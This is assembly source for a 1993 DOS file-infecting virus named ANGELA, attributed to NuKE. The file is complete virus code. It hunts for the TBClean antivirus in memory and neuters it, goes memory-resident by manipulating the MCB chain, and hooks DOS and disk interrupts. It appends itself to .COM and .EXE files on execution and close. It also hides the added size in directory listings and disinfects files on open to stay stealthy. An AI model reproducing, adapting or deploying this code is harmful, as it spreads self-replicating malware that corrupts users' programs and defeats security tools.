;===============================================================================
;
;       (c) 1993 by NuKE Computer Security Publications, Inc.
;           Developed by Rock Steady of NuKE Inc.
;
;       <ANGELA.ASM>
;
virus_size      equ     last - init_virus               ;virus size (bytes)

seg_a           segment byte public
                assume  cs:seg_a,ds:seg_a

                org     100h                            ;compile to .com

start:          jmp     init_virus

;-------------------------------------------------------------------------------
init_virus:     call    doit_now                        ;begin virus

doit_now:       pop     bp                              ;pop call offset
                sub     bp,offset doit_now              ;fix it with pointer

                push    ax
                push    bx                              ;save the registers
                push    cx
                push    dx
                push    si
                push    ds


                mov     byte ptr cs:[tb_here][bp],00h
                xor     dx,dx                           ;dx=0
                mov     ds,dx                           ;ds=0
                mov     ax,word ptr ds:[0006h]          ;ax=0000:0006 segment of
                                                        ; int 1h
                mov     ds,ax                           ;ds=segment of int 1
                mov     cx,0FFFFh                       ;cx=64k
                mov     si,dx                           ;si=0

look_4_tbclean: cmp     word ptr ds:[si],0A5F3h         ;look TBClean in memory
                je      check_it                        ;jmp if its TBClean
look_again:     inc     si                              ;if not continue looking
                loop    look_4_tbclean
                jmp     not_found                       ;not found cont normal

check_it:       cmp     word ptr ds:[si+2],0C7FAh       ;check TBClean string
                jne     look_again                      ;jmp =! tbclean
                cmp     word ptr ds:[si+4],0006h        ;check TBClean string
                jne     look_again                      ;jmp =! tbclean
                cmp     word ptr ds:[si+10],020Eh       ;check TBClean string
                jne     look_again                      ;jmp =! tbclean
                cmp     word ptr ds:[si+12],0C700h      ;check TBClean string
                jne     look_again                      ;jmp =! tbclean
                cmp     word ptr ds:[si+14],0406h       ;check TBClean string
                jne     look_again                      ;jmp =! tbclean

                mov     bx,word ptr ds:[si+17]          ;steal REAL int 1 offset
                mov     byte ptr ds:[bx],0CFh           ;replace with IRET

                mov     bx,word ptr ds:[si+27]          ;steal REAL int 3 offset
                mov     byte ptr ds:[bx],0CFh           ;replece with IRET

                mov     byte ptr cs:[tb_here][bp],01h   ;set the TB flag on

                mov     bx,word ptr ds:[si+51h]         ;get 2nd segment of ints
                mov     word ptr cs:[tb_int2][bp],bx    ;vector table

                mov     bx,word ptr ds:[si-5]           ;get offset of 1st copy
                mov     word ptr cs:[tb_ints][bp],bx    ;of vector table

not_found:      xor     dx,dx
                push    ds
                mov     ds,dx                           ;put that in ds
                les     si,dword ptr ds:[0084h]         ;get int21 vector
                mov     word ptr cs:[int21][bp],si      ;save int21 offset
                mov     word ptr cs:[int21+2][bp],es    ;save int21 segment

                les     si,dword ptr ds:[0070h]         ;get int1c vector
                mov     word ptr cs:[int1c][bp],si      ;save int1c offset
                mov     word ptr cs:[int1c+2][bp],es    ;save int1c segment

                les     si,dword ptr ds:[004ch]         ;get int13 vector
                mov     word ptr cs:[int13][bp],si      ;save int13 offset
                mov     word ptr cs:[int13+2][bp],es    ;save int13 segment
                pop     ds

                mov     byte ptr cs:[mcb][bp],00h       ;reset the TB mcb flag
                mov     ax,0abcdh                       ;test if virus is here?
                int     13h
                cmp     bx,0abcdh                       ;is it?
                jne     install_virus                   ;jmp, if not & install
leave_mcb:      jmp     exit_mem                        ;yes, leave then

;--------- Going Resident ------

steal_some:     mov     al,byte ptr cs:[mcb][bp]        ;if tb is here, steal
                cmp     al,0ffh                         ;memory from it!
                je      leave_mcb                       ;error? exit then
                inc     byte ptr cs:[mcb][bp]           ;inc flag
                cmp     al,01                           ;
                ja      mcb3_1

install_virus:  mov     ah,52h                          ;get the list of lists
                int     21h                             ;use dos
                mov     ax,es:[bx-2]                    ;get first mcb chain

                mov     es,ax                           ;es=segment of 1st mcb
mcb1:           cmp     byte ptr es:[0000h],'Z'         ;is it the last mcb
                jne     mcb2                            ;jmp if not
                clc                                     ;yes last mcb, CLC
                jmp     short mcbx                      ;outta here

mcb2:           cmp     byte ptr es:[0000h],'M'         ;is it in the chain
                je      mcb3                            ;jmp if yes
                stc                                     ;error, set carry flag
                jmp     short mcbx                      ;outta here

mcb3:           cmp     byte ptr cs:[mcb][bp],0         ;is TB flag off?
                je      mcb3_1                          ;if yes, then jmp
                mov     dx,ds                           ;else cmp TB ds
                sub     dx,10h                          ;ds-10
                cmp     word ptr es:[0001h],dx          ;cmp to mcb owner.
                je      mcbx_1

mcb3_1:         mov     ax,es                           ;ax=es
                add     ax,word ptr es:[0003h]          ;ax=es + next mcb
                inc     ax                              ;get mcb
                mov     es,ax                           ;es=ax:next mcb chain
                jmp     short mcb1                      ;goto first step

mcbx:           jc      leave_mcb                       ;if error, exit
mcbx_1:         cmp     word ptr es:[0003],(virus_size/16) + 11h
                jb      steal_some
                mov     byte ptr es:[0000],'Z'          ;the last mcb chain!
                sub     word ptr es:[0003],(virus_size/16) + 11h
                add     ax,word ptr es:[0003h]          ;figure out segment
                inc     ax                              ;add 16 bytes
                mov     es,ax                           ;new segment in es
                mov     di,103h                         ;offset is 103h
                push    ds                              ;save TB ds location
                push    cs
                pop     ds                              ;virus cs=ds
                mov     si,offset init_virus            ;si=top of virus
                add     si,bp                           ;add delta
                mov     cx,virus_size                   ;move virus_size
                cld                                     ;clear direction flag
                repne   movsb                           ;do it Mr. Crunge

                mov     ds,cx                           ;ds=0000
hook_again:     cli                                     ;disable ints
                mov     word ptr ds:[0084h],offset int21_handler     ;hook int21
                mov     word ptr ds:[0086h],es
                mov     word ptr ds:[0070h],offset int1c_handler     ;hook int1c
                mov     word ptr ds:[0072h],es
                mov     word ptr ds:[004ch],offset int13_handler     ;hook int13
                mov     word ptr ds:[004eh],es
                sti                                     ;enable ints

                cmp     byte ptr cs:[tb_here][bp],00h   ;was TB found?
                je      go_on                           ;no, then jmp
                cmp     cl,01h                          ;is this the 2nd x here?
                je      go_on                           ;yes, then jmp
                mov     ds,word ptr cs:[tb_int2][bp]    ;get TB int segment
                inc     cl                              ;inc cl
                jmp     short hook_again                ;hook ints again

go_on:          pop     ds                              ;get TB code segment
                cmp     byte ptr cs:[tb_here][bp],01h   ;TB here?
                je      hook_tb_ints                    ;yes, then jmp
                jmp     exit_mem                        ;else exit
hook_tb_ints:   mov     si,word ptr cs:[tb_ints][bp]    ;get TB int offset
                mov     word ptr ds:[si+84h],offset int21_handler
                mov     word ptr ds:[si+86h],es
                mov     word ptr ds:[si+70h],offset int1c_handler
                mov     word ptr ds:[si+72h],es
                mov     word ptr ds:[si+4ch],offset int13_handler
                mov     word ptr ds:[si+4eh],es

exit_mem:       cmp     word ptr cs:[buffer][bp],5A4Dh  ;.exe file?
                je      exit_exe_file                   ;yupe exit exe file
                cmp     word ptr cs:[buffer][bp],4D5Ah  ;.exe file?
                je      exit_exe_file                   ;yupe exit exe file
                push    cs                              ;fix cs=ds for .com
                pop     ds
                mov     bx,offset buffer                ;get first 3 bytes
                add     bx,bp                           ;fix delta
                mov     ax,[bx]                         ;move first 2 bytes
                mov     word ptr ds:[100h],ax           ;put em in the beginning
                inc     bx                              ;inc pointer
                inc     bx
                mov     al,[bx]                         ;get last of 3rd byte
                mov     byte ptr ds:[102h],al           ;put that in place
                pop     ds
                pop     si
                pop     dx
                pop     cx
                pop     bx
                pop     word ptr cs:[ax_reg][bp]        ;save ax else where
                mov     ax,100h
                push    ax                              ;fake a CALL & RETN
                mov     ax,word ptr cs:[ax_reg][bp]     ;put ax as normal
                retn                                    ;link to 100h

exit_exe_file:  mov     dx,ds                           ;get psp=ds seg
                add     dx,10h                          ;add 16bytes to seg
                pop     ds
                pop     si
                pop     word ptr cs:[ax_reg][bp]
                pop     cx
                pop     bx
                pop     ax
                add     word ptr cs:[buffer+22][bp],dx  ;fix segments
                add     dx,word ptr cs:[buffer+14][bp]
                cli
                mov     ss,dx                           ;restore ss
                mov     sp,word ptr cs:[buffer+16][bp]  ;and sp
                sti
                mov     dx,word ptr cs:[ax_reg][bp]
                jmp     dword ptr cs:[buffer+20][bp]    ;jmp to entry pt.

mcb             db      0
ax_reg          dd      0
int13           dd      0
int1c           dd      0
int21           dd      0
tb_ints         dd      0
tb_here         db      0
tb_int2         dd      0

;===============================================================================
;                       Int 13h Handler
;===============================================================================
int13_handler:
                cmp     ax,0abcdh                       ;virus test
                je      int13_test                      ;yupe

int13call:      jmp     dword ptr cs:[int13]            ;original int13

int13_test:     mov     bx,ax                           ;fix
                iret
;===============================================================================
;                       Int 1Ch Handler
;===============================================================================
int1c_handler:
                iret
;-------------------------------------------------------------------------------
;                       FCB Dir Stealth Routine (File Find)
;-------------------------------------------------------------------------------
fcb_dir:        call    calldos21                       ;get the fcb block
                test    al,al                           ;test for error
                jnz     fcb_out                         ;jmp if error
                push    ax                              ;save registers
                push    bx
                push    cx
                push    es
                mov     ah,51h                          ;get current psp
                call    calldos21                       ;call int21

                mov     es,bx                           ;es=segment of psp
                cmp     bx,es:[16h]                     ;psp of command.com?
                jnz     fcb_out1                        ;no, then jmp
                mov     bx,dx                           ;ds:bx=fcb
                mov     al,[bx]                         ;1st byte of fcb
                push    ax                              ;save it
                mov     ah,2fh                          ;get dta
                call    calldos21                       ;es:bx <- dta

                pop     ax                              ;get first byte
                inc     al                              ;al=ffh therefor al=ZR
                jnz     fcb_old                         ;if != ZR jmp
                add     bx,7h                           ;extended fcb here, +7
fcb_old:        mov     ax,es:[bx+17h]                  ;get file time stamp
                mov     cx,es:[bx+19h]                  ;get file date stamp
                and     ax,1fh                          ;unmask seconds field
                and     cx,1fh                          ;unmask day of month
                xor     ax,cx                           ;are they equal?
                jnz     fcb_out1                        ;nope, exit then
                sub     word ptr es:[bx+1dh],virus_size ;sub away virus_size
                sbb     word ptr es:[bx+1fh],0          ;sub with carry flag

fcb_out1:       pop     es                              ;restore registers
                pop     cx
                pop     bx
                pop     ax
fcb_out:        iret                                    ;return control
;-------------------------------------------------------------------------------
;                       ASCIIZ Dir Stealth Routine (File Find)
;-------------------------------------------------------------------------------
dta_dir:        call    calldos21                       ;get results to dta
                jb      dta_out                         ;if error, split
                push    ax                              ;save register
                push    bx
                push    cx
                push    es
                mov     ah,2fh                          ;get current dta
                call    calldos21                       ;es:bx <- dta

                mov     ax,es:[bx+16h]                  ;get file time stamp
                mov     cx,es:[bx+18h]                  ;get file date stamp
                and     ax,1fh                          ;unmask seconds field
                and     cx,1fh                          ;unmask day of month
                xor     ax,cx                           ;are they equal
                jnz     dta_out1                        ;nope, exit then
                sub     word ptr es:[bx+1ah],virus_size ;sub away virus_size
                sbb     word ptr es:[bx+1ch],0          ;sub with carry flag

dta_out1:       pop     es                              ;restore registers
                pop     cx
                pop     bx
                pop     ax
dta_out:        retf    0002h                           ;pop 2 words of stack
;===============================================================================
;                       Int 21h Handler
;===============================================================================
int21_handler:
;                cmp     ah,11h                          ;FCB find first match
;                je      old_dir
;                cmp     ah,12h                          ;FCB find next match
;                je      old_dir
                cmp     ah,4eh                          ;Find first match
                je      new_dir
                cmp     ah,4fh                          ;Find next match
                je      new_dir
                cmp     ah,3dh                          ;Opening a file
                je      file_open
                cmp     ah,6ch                          ;Ext_opening a file
                je      file_ext_open
                cmp     ah,3eh                          ;closing a file
                je      file_close
                cmp     ah,4bh                          ;Execution of a file
                je      file_execute

int21call:      jmp     dword ptr cs:[int21]            ;original int21

old_dir:        jmp     fcb_dir                         ;fcb file find

new_dir:        jmp     dta_dir                         ;new asciiz file find

file_open:      jmp     open_file                       ;disinfect opening file

file_ext_open:  jmp     open_ext_file                   ;disinfect opening file

file_close:     jmp     close_file                      ;infect closing file

file_execute:   call    check_extension                 ;check for ok ext
                cmp     byte ptr cs:[com_ext],1         ;is it a com?
                je      exec_disinfect                  ;yupe disinfect it
                cmp     byte ptr cs:[exe_ext],1         ;is it a exe?
                je      exec_disinfect                  ;yupe disinfect it
                jmp     SHORT int21call

exec_disinfect: call    exec_disinfect1                 ;Disinfect file

                mov     word ptr cs:[ax_reg],dx
                pushf                                   ;fake an int
                call    dword ptr cs:[int21]            ;call dos
                xchg    word ptr cs:[ax_reg],dx         ;restore dx

                mov     byte ptr cs:[close],0           ;reset flag..
                push    ax                              ;store 'em
                push    bx
                push    cx
                push    dx
                push    si
                push    di
                push    es
                push    ds
closing_infect: mov     ax,3524h                        ;get error handler
                call    calldos21                       ;call dos

                push    es                              ;save es:bx= int_24
                push    bx                              ;error handler
                push    ds                              ;ds:dx= asciiz string
                push    dx
                push    cs                              ;cs=ds
                pop     ds
                mov     dx,offset int21_handler         ;hook error handler
                mov     ax,2524h                        ;with our int24h
                call    calldos21
                pop     dx                              ;restore ds:dx asciiz
                pop     ds                              ;string

                cmp     byte ptr cs:[close],0           ;Are we closing file?
                je      exec_get_att                    ;nope, then jmp
                mov     ax,word ptr cs:[handle]         ;yupe, ax=file handle
                jmp     exec_open_ok                    ;jmp so you don't open
                                                        ;the file twice...
exec_get_att:   mov     ax,4300h                        ;get file attribs
                call    calldos21                       ;call dos
                jnc     exec_attrib                     ;no, error jmp
                jmp     exec_exit2                      ;ERROR - split

exec_attrib:    mov     byte ptr cs:[attrib],cl
                test    cl,1                            ;check bit 0 (read_only)
                jz      exec_attrib_ok                  ;if bit0=0 jmp
                dec     cx                              ;else turn of bit_0
                mov     ax,4301h                        ;write new attribs
                call    calldos21                       ;call dos

exec_attrib_ok: mov     ax,3d02h                        ;open file for r/w
                call    calldos21                       ;call dos
                jnc     exec_open_ok                    ;ok, no error jmp
                jmp     exec_exit2                      ;ERROR - split

exec_open_ok:   xchg    bx,ax                           ;bx=file handler
                push    cs                              ;cs=ds
                pop     ds
                mov     ax,5700h                        ;get file time/date
                call    calldos21                       ;call dos

                mov     word ptr cs:[old_time],cx       ;save file time
                mov     word ptr cs:[org_time],cx
                mov     word ptr cs:[old_date],dx       ;save file date
                and     cx,1fh                          ;unmask second field
                and     dx,1fh                          ;unmask date field
                xor     cx,dx                           ;are they equal?
                jnz     exec_time_ok                    ;nope, file not infected
                jmp     exec_exit3                      ;FILE INFECTED

exec_time_ok:   and     word ptr cs:[old_time],0ffe0h   ;reset second bits
                or      word ptr cs:[old_time],dx       ;seconds=day of month

                mov     ax,4200h                        ;reset ptr to beginning
                xor     cx,cx                           ;(as opened files may
                xor     dx,dx                           ; have ptr anywhere,
                call    calldos21                       ; so be smart!)

                mov     word ptr cs:[marker],0DBDBh     ;File Infection marker
                mov     dx,offset ds:[buffer]           ;ds:dx buffer
                mov     cx,18h                          ;read 18h bytes
                mov     ah,3fh                          ;read from handle
                call    calldos21                       ;call dos

                jc      exec_exit1                      ;error? if yes jmp
                sub     cx,ax                           ;did we read 18h bytes?
                jnz     exec_exit1                      ;if no exit
                mov     dx,cx                           ;cx=0 dx=0
                mov     ax,4202h                        ;jmp to EOF
                call    calldos21                       ;call dos

                jc      exec_exit1                      ;error? exit if so.
                mov     word ptr cs:[filesize+2],ax     ;save lower 16bit fileSz
                mov     word ptr cs:[filesize],dx       ;save upper 16bit fileSz
                call    chkbuf                          ;check if .exe
                jz      exec_cool                       ;jmp if .exe file
                cmp     ax,0FFF0h - virus_size          ;64k-256-virus < 64k?
                jb      exec_cool                       ;if less jmp!

exec_exit1:     jmp     exec_exit3                      ;exit!

;_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
;                       Mutate and infect
;-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_

exec_cool:      mov     dx,offset init_virus            ;ds:dx=virus beginning
                mov     cx,virus_size                   ;cx=virus size
                mov     ah,40h                          ;write to handle
                call    calldos21                       ;call dos

                jc      exec_exit1                      ;error? if yes exit
                sub     cx,ax                           ;cx=ax bytes?
                jnz     exec_exit1                      ;not equal exit
                mov     dx,cx                           ;cx=0 dx=0
                mov     ax,4200h                        ;jmp to top of file
                call    calldos21                       ;call dos

                jc      exec_exit1                      ;error, then exit
                mov     ax,word ptr cs:[filesize+2]     ;ax=lower 16bit fileSize
                call    chkbuf                          ;check if .exe
                jnz     exec_com_file                   ;if !=.exe jmp
                mov     dx,word ptr cs:[filesize]       ;get upper 16bit

                mov     cx,4                            ;cx=0004
                mov     si,word ptr cs:[buffer+8]       ;get exe header size
                shl     si,cl                           ;mul by 16
                sub     ax,si                           ;exe_header - filesize
                sbb     dx,0h                           ;sub with carry

                mov     cx,10h                          ;cx=0010
                div     cx                              ;ax=length in para
                                                        ;dx=remaider
                mov     word ptr cs:[buffer+20],dx      ;New IP offset address
                mov     word ptr cs:[buffer+22],ax      ;New CS (In paragraphs)
                add     dx,virus_size+100h              ;Dx=virus_size+256

                mov     word ptr cs:[buffer+16],dx      ;New SP entry
                mov     word ptr cs:[buffer+14],ax      ;New SS (in para)
                add     word ptr cs:[buffer+10],(virus_size)/16+1   ;min para
                mov     ax,word ptr cs:[buffer+10]      ;ax=min para needed
                cmp     ax,word ptr cs:[buffer+12]      ;cmp with max para
                jb      exec_size_ok                    ;jmp if ok!
                mov     word ptr cs:[buffer+12],ax      ;nop, enter new max

exec_size_ok:   mov     ax,word ptr cs:[buffer+2]       ;ax=file size
                add     ax,virus_size                   ;add virus to it
                push    ax                              ;push it
                and     ah,1                            ;
                mov     word ptr cs:[buffer+2],ax       ;restore new value
                pop     ax                              ;pop ax
                mov     cl,9                            ;
                shr     ax,cl                           ;
                add     word ptr cs:[buffer+4],ax       ;enter fileSz + header
                mov     dx,offset buffer                ;ds:dx=new exe header
                mov     cx,18h                          ;cx=18h bytes to write
                jmp     SHORT exec_write_it             ;jmp...

exec_com_file:  sub     ax,3                            ;sub 3 for jmp address
                mov     word ptr cs:[buffer+1],ax       ;store new jmp value
                mov     byte ptr cs:[buffer],0E9h       ;E9h=JMP
                mov     dx,offset buffer                ;ds:dx=buffer
                mov     cx,3                            ;cx=3 bytes

exec_write_it:  mov     ah,40h                          ;write to file handle
                call    calldos21                       ;call dos

                mov     dx,word ptr cs:[old_date]       ;restore old date
                mov     cx,word ptr cs:[old_time]       ;restore old time
                mov     ax,5701h                        ;write back to file
                call    calldos21                       ;call dos

exec_exit3:     mov     ah,3eh                          ;close file
                call    calldos21                       ;call dos

exec_exit2:     pop     dx                              ;restore es:bx (the
                pop     ds                              ;original int_24)
                mov     ax,2524h                        ;put back to place
                call    calldos21                       ;call dos

                pop     ds
                pop     es
                pop     di                              ;pop registers
                pop     si
                pop     dx
                xor     cx,cx
                mov     cl,byte ptr cs:[attrib]         ;get old file attrib
                mov     ax,4301h                        ;put them back
                call    calldos21                       ;call dos
                pop     cx
                pop     bx
                pop     ax

                cmp     byte ptr cs:[close],0           ;get called by exec?
                je      exec_good_bye                   ;yep, then jmp
                iret                                    ;else exit now.

exec_good_bye:  mov     dx,word ptr cs:[ax_reg]         ;restore dx
                iret                                    ;iret
;-------------------------------------------------------------------------------
;                       Close File Int21h/ah=3Eh
;-------------------------------------------------------------------------------
close_file:     cmp     bx,4h                           ;file handler > 4?
                ja      close_cont                      ;jmp if above
                jmp     int21call                       ;else exit

close_cont:     push    ax                              ;save 'em
                push    bx
                push    cx
                push    dx
                push    si
                push    di
                push    es
                push    ds

                push    bx                              ;save file handler
                mov     ax,1220h                        ;get job file table!
                int     2fh                             ;call multiplex
                                                        ;es:di=JFT for handler
                mov     ax,1216h                        ;get system file table
                mov     bl,es:[di]                      ;bl=SFT entry
                int     2fh                             ;call multiplex
                pop     bx                              ;save file handler

                add     di,0011h
                mov     byte ptr es:[di-0fh],02h        ;set to read/write

                add     di,0017h
                cmp     word ptr es:[di],'OC'           ;check for .COM file
                jne     closing_next_try                ;no try next ext
                cmp     byte ptr es:[di+2h],'M'         ;check last letter
                je      closing_cunt3                   ;no, file no good, exit

closing_exit:   jmp     closing_nogood                  ;exit

closing_next_try:
                cmp     word ptr es:[di],'XE'           ;check for .EXE file
                jne     closing_exit                    ;no, exit
                cmp     byte ptr es:[di+2h],'E'         ;check last letter
                jne     closing_exit                    ;no, exit

closing_cunt3:  mov     byte ptr cs:[close],1           ;set closing flag
                mov     word ptr cs:[handle],bx         ;save handler
                jmp     closing_infect                  ;infect file!

closing_nogood: pop     ds                              ;restore 'em
                pop     es
                pop     di
                pop     si
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                jmp     int21call                       ;good bye, baby...
;-------------------------------------------------------------------------------
;               Execute Disinfecting routine
;-------------------------------------------------------------------------------
exec_disinfect1         PROC
                push    ax                              ;save registers
                push    bx
                push    cx
                push    dx
                push    ds

                mov     ax,4300h                        ;get file attribs
                call    calldos21                       ;call dos

                test    cl,1h                           ;is Read-only flag?
                jz      okay_dis                        ;no, jmp attribs ok
                dec     cx                              ;turn off bit 0
                mov     ax,4301h                        ;write new attribs
                call    calldos21                       ;call dos
                jnc     okay_dis                        ;No error? then jmp
                jmp     end_dis                         ;error? exit!

okay_dis:       mov     ax,3d02h                        ;open file for r/w
                call    calldos21                       ;call dos
                jnc     dis_fileopen                    ;No error? then jmp
                jmp     end_dis                         ;Error? exit!

dis_fileopen:   xchg    bx,ax                           ;bx=file handle
                mov     ax,5700h                        ;get file time/date
                call    calldos21                       ;call dos

                mov     word ptr cs:[old_time],cx       ;save file time
                mov     word ptr cs:[old_date],dx       ;save file date
                and     cx,1fh                          ;unmask second field
                and     dx,1fh                          ;unmask date field
                xor     cx,dx                           ;are they equal?
                jnz     half_way                        ;nope, file not infected

                mov     ax,4202h                        ;jmp to EOF
                xor     cx,cx                           ;cx=0
                xor     dx,dx                           ;dx=0
                call    calldos21                       ;call dos

                push    cs                              ;cs=ds
                pop     ds                              ;
                mov     cx,dx                           ;dx:ax=file size
                mov     dx,ax                           ;save to cx:dx
                push    cx                              ;save upper fileSz
                push    dx                              ;save lower fileSz

                sub     dx,1Ch                          ;filesize-1C=origin byte
                sbb     cx,0                            ;sub with carry
                mov     ax,4200h                        ;position ptr
                call    calldos21                       ;call dos

                mov     ah,3fh                          ;open file
                mov     cx,1Ch                          ;read last 1Ch bytes
                mov     dx,offset org_time              ;put in ds:dx
                call    calldos21                       ;call dos
                call    chkbuf                          ;Did it work?
                je      half                            ;Yes,Jmp
                cmp     word ptr ds:[marker],0DBDBh     ;File REALLY Infected?
                je      half                            ;Yes, then jmp

                pop     dx
                pop     cx
half_way:       jmp     end_dis1                        ;exit, error!

half:           xor     cx,cx                           ;cx=0
                xor     dx,dx                           ;dx=0
                mov     ax,4200h                        ;pointer to top of file
                call    calldos21                       ;call dos

                mov     ah,40h                          ;write function
                mov     dx,offset buffer                ;ds:dx=buffer
                mov     cx,18h                          ;cx=18h bytes to write
                call    chkbuf                          ;check if .exe?
                jz      SHORT dis_exe_jmp               ;yupe, jmp
                mov     cx,3h                           ;else write 3 bytes
dis_exe_jmp:    call    calldos21                       ;call dos

                pop     dx                              ;pop original fileSz
                pop     cx

                sub     dx,virus_size                   ;Sub with virus_size
                sbb     cx,0                            ;sub with carry
                mov     ax,4200h                        ;ptr top of virus
                call    calldos21                       ;call dos

                mov     ah,40h                          ;write function
                xor     cx,cx                           ;write 0 bytes
                call    calldos21                       ;call dos! (new EOF)

                mov     cx,word ptr ds:[org_time]       ;get original time
                mov     dx,word ptr ds:[old_date]       ;get original date
                mov     ax,5701h                        ;put back to file
                call    calldos21                       ;call dos

end_dis1:       mov     ah,3eh                          ;close file handle
                call    calldos21                       ;call dos

end_dis:        pop     ds                              ;restore values
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                ret
exec_disinfect1         ENDP
;-------------------------------------------------------------------------------
;                       Open File by DOS Int21h/ah=6ch
;-------------------------------------------------------------------------------
open_ext_file:  push    dx                              ;save DX
                mov     dx,si                           ;asciiz=DS:DX now
                jmp     open_ext                        ;jmp
;-------------------------------------------------------------------------------
;                       Open File by DOS Int21h/ah=3Dh
;-------------------------------------------------------------------------------
open_file:      push    dx                              ;save dx (asciiz)
open_ext:       call    check_extension                 ;check extension
                cmp     byte ptr cs:[com_ext],1         ;is it a .com?
                je      open_ok_ext                     ;yep, then jmp
                cmp     byte ptr cs:[exe_ext],1         ;is it a .exe?
                je      open_ok_ext                     ;yep, them jmp
                jmp     open_exit                       ;ext no good, exit!

open_ok_ext:    call    exec_disinfect1                 ;disinfect file!
open_exit:      pop     dx                              ;restore dx
                jmp     int21call                       ;exit to dos...
;-------------------------------------------------------------------------------
;                       Checks Buffer (EXE) Header
;-------------------------------------------------------------------------------
chkbuf                  PROC
                push    si                              ;save register
                mov     si,word ptr cs:[buffer]         ;get first word
                cmp     si,5A4Dh                        ;si=ZM?
                je      chkbuf_ok                       ;if yes exit
                cmp     si,4D5Ah                        ;si=MZ?
chkbuf_ok:      pop     si                              ;pop register
                ret
chkbuf                  ENDP
;-------------------------------------------------------------------------------
;                       Check file Extension
;-------------------------------------------------------------------------------
check_extension         PROC
                pushf                                   ;save flags
                push    cx                              ;save cx,si
                push    si
                mov     si,dx                           ;ds:[si]=asciiz
                mov     cx,128                          ;scan 128 bytes max
                mov     byte ptr cs:[com_ext],0         ;reset .com flag
                mov     byte ptr cs:[exe_ext],0         ;reset .exe flag

check_ext:      cmp     byte ptr ds:[si],2Eh            ;scan for "."
                je      check_ext1                      ;jmp if found
                inc     si                              ;else inc and loop
                loop    check_ext                       ;loop me

check_ext1:     inc     si                              ;inc asciiz ptr
                cmp     word ptr ds:[si],'OC'           ;is it .COM
                jne     check_ext2                      ;       ~~
                cmp     byte ptr ds:[si+2],'M'          ;is it .COM
                je      com_file_ext                    ;         ~

check_ext2:     cmp     word ptr ds:[si],'oc'           ;is it .com
                jne     check_ext3                      ;       ~~
                cmp     byte ptr ds:[si+2],'m'          ;is it .com
                je      com_file_ext                    ;         ~

check_ext3:     cmp     word ptr ds:[si],'XE'           ;is it .EXE
                jne     check_ext4                      ;       ~~
                cmp     byte ptr ds:[si+2],'E'          ;is it .EXE
                je      exe_file_ext                    ;         ~

check_ext4:     cmp     word ptr ds:[si],'xe'           ;is it .exe
                jne     check_ext_exit                  ;       ~~
                cmp     byte ptr ds:[si+2],'e'          ;is it .exe
                je      exe_file_ext                    ;         ~
                jmp     check_ext_exit                  ;neither exit

com_file_ext:   mov     byte ptr cs:[com_ext],1         ;found .com file
                jmp     SHORT check_ext_exit            ;jmp short
exe_file_ext:   mov     byte ptr cs:[exe_ext],1         ;found .exe file

check_ext_exit: pop     si                              ;restore
                pop     cx
                popf                                    ;save flags
                ret

com_ext         db      0                               ;flag on=.com file
exe_ext         db      0                               ;flag on=.exe file
check_extension         ENDP
;-------------------------------------------------------------------------------
;                       Original Int21h
;-------------------------------------------------------------------------------
calldos21               PROC
                pushf                                   ;fake int call
                call    dword ptr cs:[int21]            ;call original int_21
                ret
calldos21               ENDP
;===============================================================================
;                       Int 24h Handler
;===============================================================================
int24_handler:
                mov     al,3                            ;don't report error...
                iret                                    ;later dude...
;-------------------------------------------------------------------------------
;              FLAGS - FLAGS - FLAGS - FLAGS - FLAGS

close           db      0                       ;closing file

;-------------------------------------------------------------------------------
;             END - END - END - END - END - END - END

rand_val        dw      0
flags           dw      0                       ;Flags are saved here
attrib          db      0                       ;file's attrib
filesize        dd      0                       ;filesize
handle          dw      0                       ;file handler
old_date        dw      0                       ;file date
old_time        dw      0                       ;file time
;-------------------------------------------------------------------------------
org_time        dw      0                       ;original file time

;-------------------------------------------------------------------------------
buffer          db      0CDh,020h       ; 0 (0)  EXE file signature
                db      090h,090h       ; 2 (2)  Length of file
                db      090h,090h       ; 4 (4)  Size of file + header (512k)
                db      090h,090h       ; 6 (6)  # of relocation items
                db      090h,090h       ; 8 (8)  Size of header (16byte para)
                db      090h,090h       ; A (10) Min para needed (16byte)
                db      090h,090h       ; C (12) Max para needed (16byte)
                db      090h,090h       ; E (14) SS reg from start in para.
                db      090h,090h       ; 10(16) SP reg at entry
                db      090h,090h       ; 12(18) checksum
                db      090h,090h       ; 14(20) IP reg at entry
                db      090h,090h       ; 16(22) CS reg from start in para.
Marker          db      0DBh,0DBh       ; Marks THIS File as INFECTED!
last:
seg_a           ends
                end     start
